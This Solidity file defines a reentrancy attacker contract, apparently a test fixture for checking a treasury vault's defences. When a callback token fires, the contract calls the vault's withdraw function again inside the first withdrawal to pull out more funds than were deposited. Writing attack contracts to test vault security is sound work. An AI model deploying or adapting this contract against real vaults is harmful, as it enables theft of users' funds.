// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITreasuryVaultForAttack {
    function deposit(address asset, uint256 amount) external;
    function withdraw(address asset, uint256 amount) external;
}

interface ICallbackToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function setCallbackTarget(address target) external;
    function setCallbackEnabled(bool enabled) external;
}

contract ReentrancyAttacker {
    ITreasuryVaultForAttack public immutable vault;
    ICallbackToken public immutable token;

    uint256 public attackAmount;
    bool private attacking;

    constructor(address vault_, address token_) {
        require(vault_ != address(0), "Vault address cannot be zero");
        require(token_ != address(0), "Token address cannot be zero");

        vault = ITreasuryVaultForAttack(vault_);
        token = ICallbackToken(token_);
    }

    function prepare(uint256 amount) external {
        require(amount > 0, "Amount must be > 0");

        attackAmount = amount;

        token.approve(address(vault), amount);
        token.setCallbackTarget(address(this));
    }

    function deposit(address from, uint256 amount) external {
        token.transferFrom(from, address(this), amount);
        token.approve(address(vault), amount);

        vault.deposit(address(token), amount);
    }

    function attackWithdraw(uint256 amount) external {
        attacking = true;

        token.setCallbackEnabled(true);
        vault.withdraw(address(token), amount);

        token.setCallbackEnabled(false);
        attacking = false;
    }

    function onTokenReceived() external {
        if (attacking) {
            vault.withdraw(address(token), attackAmount);
        }
    }
}